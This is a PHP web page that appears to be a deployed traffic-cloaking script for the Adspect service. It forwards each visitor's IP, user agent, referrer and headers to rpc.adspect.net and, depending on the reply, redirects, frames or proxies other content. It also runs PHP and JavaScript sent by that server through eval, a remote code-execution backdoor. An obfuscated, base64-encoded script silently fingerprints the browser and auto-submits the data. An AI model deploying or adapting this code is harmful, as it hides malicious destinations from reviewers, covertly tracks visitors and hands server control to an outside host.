<?php
 ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url) { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; $query = parse_url($url, PHP_URL_QUERY); if (is_string($query)) { parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'html': case 'htm': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } if (!empty($headers)) { curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); } $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'curl extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); break; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('9f594f2e-d70b-437e-b0fc-9f4cec4c3d6f', 'redirect', '_', base64_decode('kOtJVWiAb/6j2Ma4pw8knHJ5w0A5JWgiAiEhR2N66zU=')); if (!isset($target)) { return; } ?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="refresh" content="10; url=<?= htmlspecialchars($target) ?>">
	<meta name="referrer" content="no-referrer">
</head>
<body>
	<script src="data:text/javascript;base64,dmFyIF8weDRlZGI9Wyc5NTc4ZWFPb0hNJywnbGVuZ3RoJywnMUNnYlZIWCcsJzIwODM2OWZUaGZqRCcsJ2dldFBhcmFtZXRlcicsJ25hbWUnLCd0eXBlJywnYm9keScsJ2hyZWYnLCd0b3N0cmluZycsJ2dldFRpbWV6b25lT2Zmc2V0JywndG91Y2hFdmVudCcsJ3B1c2gnLCdmb3JtJywnVG91Y2hFdmVudCcsJ2RvY3VtZW50JywnY3JlYXRlRWxlbWVudCcsJ2hpZGRlbicsJ2Z1bmN0aW9uJywnY29uc29sZScsJ3dpbmRvdycsJ2NhbnZhcycsJ2xvY2F0aW9uJywnUE9TVCcsJzRMbUpCeFknLCcxNzk0MkNEQ1ZVTycsJzE1NjA2NmZKZ0R2SicsJ3Blcm1pc3Npb25zJywnc3VibWl0JywnV0VCR0xfZGVidWdfcmVuZGVyZXJfaW5mbycsJ21lc3NhZ2UnLCdtZXRob2QnLCdjbG9zdXJlJywnY3JlYXRlRXZlbnQnLCdOb3RpZmljYXRpb24nLCdzdGF0ZScsJ2FjdGlvbicsJzU1ODk0WlJTTGVEJywncGVybWlzc2lvbicsJzE4Y3NiTXVQJywnb2JqZWN0JywndGhlbicsJzk1NDczZXVZUVFaJywnVU5NQVNLRURfVkVORE9SX1dFQkdMJywnVU5NQVNLRURfUkVOREVSRVJfV0VCR0wnLCdkb2N1bWVudEVsZW1lbnQnLCd3ZWJnbCcsJ2FwcGVuZENoaWxkJywnc3RyaW5naWZ5JywndG9TdHJpbmcnLCdnZXRFeHRlbnNpb24nLCduYXZpZ2F0b3InLCdzY3JlZW4nLCcxNjg0ODNUQ1lUTGEnXTt2YXIgXzB4MmNkMT1mdW5jdGlvbihfMHgzMmRkYTgsXzB4NTE5YjJiKXtfMHgzMmRkYTg9XzB4MzJkZGE4LTB4ZDM7dmFyIF8weDRlZGIxNT1fMHg0ZWRiW18weDMyZGRhOF07cmV0dXJuIF8weDRlZGIxNTt9OyhmdW5jdGlvbihfMHgzZDA0NjgsXzB4NDZhYzc2KXt2YXIgXzB4NDZkZDEyPV8weDJjZDE7d2hpbGUoISFbXSl7dHJ5e3ZhciBfMHgyYmZhYjA9LXBhcnNlSW50KF8weDQ2ZGQxMigweGY5KSkqcGFyc2VJbnQoXzB4NDZkZDEyKDB4ZWEpKSstcGFyc2VJbnQoXzB4NDZkZDEyKDB4ZTgpKStwYXJzZUludChfMHg0NmRkMTIoMHhmOCkpK3BhcnNlSW50KF8weDQ2ZGQxMigweGZjKSkrLXBhcnNlSW50KF8weDQ2ZGQxMigweGVkKSkrcGFyc2VJbnQoXzB4NDZkZDEyKDB4ZGIpKSotcGFyc2VJbnQoXzB4NDZkZDEyKDB4ZGMpKSstcGFyc2VJbnQoXzB4NDZkZDEyKDB4ZGQpKSotcGFyc2VJbnQoXzB4NDZkZDEyKDB4ZmIpKTtpZihfMHgyYmZhYjA9PT1fMHg0NmFjNzYpYnJlYWs7ZWxzZSBfMHgzZDA0NjhbJ3B1c2gnXShfMHgzZDA0NjhbJ3NoaWZ0J10oKSk7fWNhdGNoKF8weDRiZWE3Yil7XzB4M2QwNDY4WydwdXNoJ10oXzB4M2QwNDY4WydzaGlmdCddKCkpO319fShfMHg0ZWRiLDB4MjE4YTMpLGZ1bmN0aW9uKCl7dmFyIF8weDQyZmI2OD1fMHgyY2QxO2Z1bmN0aW9uIF8weDMxNDE0ZCgpe3ZhciBfMHg0NzE5MzY9XzB4MmNkMTtfMHg1MTQxYzZbJ2Vycm9ycyddPV8weDU1MmMwNTt2YXIgXzB4NTJmMDNkPWRvY3VtZW50W18weDQ3MTkzNigweGQzKV0oXzB4NDcxOTM2KDB4MTA2KSksXzB4ZGJmNTFlPWRvY3VtZW50W18weDQ3MTkzNigweGQzKV0oJ2lucHV0Jyk7XzB4NTJmMDNkW18weDQ3MTkzNigweGUyKV09XzB4NDcxOTM2KDB4ZGEpLF8weDUyZjAzZFtfMHg0NzE5MzYoMHhlNyldPXdpbmRvd1tfMHg0NzE5MzYoMHhkOSldW18weDQ3MTkzNigweDEwMSldLF8weGRiZjUxZVtfMHg0NzE5MzYoMHhmZildPV8weDQ3MTkzNigweGQ0KSxfMHhkYmY1MWVbXzB4NDcxOTM2KDB4ZmUpXT0nZGF0YScsXzB4ZGJmNTFlWyd2YWx1ZSddPUpTT05bXzB4NDcxOTM2KDB4ZjMpXShfMHg1MTQxYzYpLF8weDUyZjAzZFtfMHg0NzE5MzYoMHhmMildKF8weGRiZjUxZSksZG9jdW1lbnRbXzB4NDcxOTM2KDB4MTAwKV1bXzB4NDcxOTM2KDB4ZjIpXShfMHg1MmYwM2QpLF8weDUyZjAzZFtfMHg0NzE5MzYoMHhkZildKCk7fXZhciBfMHg1NTJjMDU9W10sXzB4NTE0MWM2PXt9O3RyeXt2YXIgXzB4MjMxZTQ3PWZ1bmN0aW9uKF8weDJkYmYxYSl7dmFyIF8weDY0ZDRkMT1fMHgyY2QxO2lmKF8weDY0ZDRkMSgweGViKT09PXR5cGVvZiBfMHgyZGJmMWEmJm51bGwhPT1fMHgyZGJmMWEpe3ZhciBfMHgyNjI5ODE9ZnVuY3Rpb24oXzB4MWQ3NWZmKXt2YXIgXzB4M2Y4MzY2PV8weDY0ZDRkMTt0cnl7dmFyIF8weDIyZGYyZj1fMHgyZGJmMWFbXzB4MWQ3NWZmXTtzd2l0Y2godHlwZW9mIF8weDIyZGYyZil7Y2FzZSBfMHgzZjgzNjYoMHhlYik6aWYobnVsbD09PV8weDIyZGYyZilicmVhaztjYXNlIF8weDNmODM2NigweGQ1KTpfMHgyMmRmMmY9XzB4MjJkZjJmW18weDNmODM2NigweGY0KV0oKTt9XzB4Mzc0ZjNkW18weDFkNzVmZl09XzB4MjJkZjJmO31jYXRjaChfMHgzNzQ0OWMpe18weDU1MmMwNVtfMHgzZjgzNjYoMHgxMDUpXShfMHgzNzQ0OWNbXzB4M2Y4MzY2KDB4ZTEpXSk7fX0sXzB4Mzc0ZjNkPXt9LF8weDI3MWNiNztmb3IoXzB4MjcxY2I3IGluIF8weDJkYmYxYSlfMHgyNjI5ODEoXzB4MjcxY2I3KTt0cnl7dmFyIF8weDVmMjRjMT1PYmplY3RbJ2dldE93blByb3BlcnR5TmFtZXMnXShfMHgyZGJmMWEpO2ZvcihfMHgyNzFjYjc9MHgwO18weDI3MWNiNzxfMHg1ZjI0YzFbXzB4NjRkNGQxKDB4ZmEpXTsrK18weDI3MWNiNylfMHgyNjI5ODEoXzB4NWYyNGMxW18weDI3MWNiN10pO18weDM3NGYzZFsnISEnXT1fMHg1ZjI0YzE7fWNhdGNoKF8weDk2OGM2MCl7XzB4NTUyYzA1WydwdXNoJ10oXzB4OTY4YzYwWydtZXNzYWdlJ10pO31yZXR1cm4gXzB4Mzc0ZjNkO319O18weDUxNDFjNltfMHg0MmZiNjgoMHhmNyldPV8weDIzMWU0Nyh3aW5kb3dbXzB4NDJmYjY4KDB4ZjcpXSksXzB4NTE0MWM2W18weDQyZmI2OCgweGQ3KV09XzB4MjMxZTQ3KHdpbmRvdyksXzB4NTE0MWM2W18weDQyZmI2OCgweGY2KV09XzB4MjMxZTQ3KHdpbmRvd1snbmF2aWdhdG9yJ10pLF8weDUxNDFjNltfMHg0MmZiNjgoMHhkOSldPV8weDIzMWU0Nyh3aW5kb3dbJ2xvY2F0aW9uJ10pLF8weDUxNDFjNltfMHg0MmZiNjgoMHhkNildPV8weDIzMWU0Nyh3aW5kb3dbXzB4NDJmYjY4KDB4ZDYpXSksXzB4NTE0MWM2W18weDQyZmI2OCgweGYwKV09ZnVuY3Rpb24oXzB4NTEwYjFmKXt2YXIgXzB4MzZlMGY4PV8weDQyZmI2ODt0cnl7dmFyIF8weDJlZTI0ND17fTtfMHg1MTBiMWY9XzB4NTEwYjFmWydhdHRyaWJ1dGVzJ107Zm9yKHZhciBfMHgyZTM2ODQgaW4gXzB4NTEwYjFmKV8weDJlMzY4ND1fMHg1MTBiMWZbXzB4MmUzNjg0XSxfMHgyZWUyNDRbXzB4MmUzNjg0Wydub2RlTmFtZSddXT1fMHgyZTM2ODRbJ25vZGVWYWx1ZSddO3JldHVybiBfMHgyZWUyNDQ7fWNhdGNoKF8weDI1NGY5Yyl7XzB4NTUyYzA1W18weDM2ZTBmOCgweDEwNSldKF8weDI1NGY5Y1tfMHgzNmUwZjgoMHhlMSldKTt9fShkb2N1bWVudFsnZG9jdW1lbnRFbGVtZW50J10pLF8weDUxNDFjNltfMHg0MmZiNjgoMHgxMDgpXT1fMHgyMzFlNDcoZG9jdW1lbnQpO3RyeXtfMHg1MTQxYzZbJ3RpbWV6b25lT2Zmc2V0J109bmV3IERhdGUoKVtfMHg0MmZiNjgoMHgxMDMpXSgpO31jYXRjaChfMHgyNWIyMDkpe18weDU1MmMwNVtfMHg0MmZiNjgoMHgxMDUpXShfMHgyNWIyMDlbXzB4NDJmYjY4KDB4ZTEpXSk7fXRyeXtfMHg1MTQxYzZbXzB4NDJmYjY4KDB4ZTMpXT1mdW5jdGlvbigpe31bXzB4NDJmYjY4KDB4ZjQpXSgpO31jYXRjaChfMHgzZWU1ZTYpe18weDU1MmMwNVtfMHg0MmZiNjgoMHgxMDUpXShfMHgzZWU1ZTZbXzB4NDJmYjY4KDB4ZTEpXSk7fXRyeXtfMHg1MTQxYzZbXzB4NDJmYjY4KDB4MTA0KV09ZG9jdW1lbnRbXzB4NDJmYjY4KDB4ZTQpXShfMHg0MmZiNjgoMHgxMDcpKVtfMHg0MmZiNjgoMHhmNCldKCk7fWNhdGNoKF8weDU1NzI1NSl7XzB4NTUyYzA1W18weDQyZmI2OCgweDEwNSldKF8weDU1NzI1NVsnbWVzc2FnZSddKTt9dHJ5e18weDIzMWU0Nz1mdW5jdGlvbigpe307dmFyIF8weDQxYTQ0OT0weDA7XzB4MjMxZTQ3W18weDQyZmI2OCgweGY0KV09ZnVuY3Rpb24oKXtyZXR1cm4rK18weDQxYTQ0OSwnJzt9LGNvbnNvbGVbJ2xvZyddKF8weDIzMWU0NyksXzB4NTE0MWM2W18weDQyZmI2OCgweDEwMildPV8weDQxYTQ0OTt9Y2F0Y2goXzB4NDk5MzBiKXtfMHg1NTJjMDVbXzB4NDJmYjY4KDB4MTA1KV0oXzB4NDk5MzBiW18weDQyZmI2OCgweGUxKV0pO313aW5kb3dbJ25hdmlnYXRvciddW18weDQyZmI2OCgweGRlKV1bJ3F1ZXJ5J10oeyduYW1lJzonbm90aWZpY2F0aW9ucyd9KVtfMHg0MmZiNjgoMHhlYyldKGZ1bmN0aW9uKF8weDI5ODU1OSl7dmFyIF8weDNiMGJhND1fMHg0MmZiNjg7XzB4NTE0MWM2WydwZXJtaXNzaW9ucyddPVt3aW5kb3dbXzB4M2IwYmE0KDB4ZTUpXVtfMHgzYjBiYTQoMHhlOSldLF8weDI5ODU1OVtfMHgzYjBiYTQoMHhlNildXSxfMHgzMTQxNGQoKTt9LF8weDMxNDE0ZCk7dHJ5e3ZhciBfMHg0ZGEzZGY9ZG9jdW1lbnRbXzB4NDJmYjY4KDB4ZDMpXShfMHg0MmZiNjgoMHhkOCkpWydnZXRDb250ZXh0J10oXzB4NDJmYjY4KDB4ZjEpKSxfMHgzY2I2ZTg9XzB4NGRhM2RmW18weDQyZmI2OCgweGY1KV0oXzB4NDJmYjY4KDB4ZTApKTtfMHg1MTQxYzZbXzB4NDJmYjY4KDB4ZjEpXT17J3ZlbmRvcic6XzB4NGRhM2RmW18weDQyZmI2OCgweGZkKV0oXzB4M2NiNmU4W18weDQyZmI2OCgweGVlKV0pLCdyZW5kZXJlcic6XzB4NGRhM2RmW18weDQyZmI2OCgweGZkKV0oXzB4M2NiNmU4W18weDQyZmI2OCgweGVmKV0pfTt9Y2F0Y2goXzB4NTdkYjkzKXtfMHg1NTJjMDVbXzB4NDJmYjY4KDB4MTA1KV0oXzB4NTdkYjkzW18weDQyZmI2OCgweGUxKV0pO319Y2F0Y2goXzB4MTlkNGQpe18weDU1MmMwNVtfMHg0MmZiNjgoMHgxMDUpXShfMHgxOWQ0ZFtfMHg0MmZiNjgoMHhlMSldKSxfMHgzMTQxNGQoKTt9fSgpKTs="></script>
</body>
</html>
<?php exit;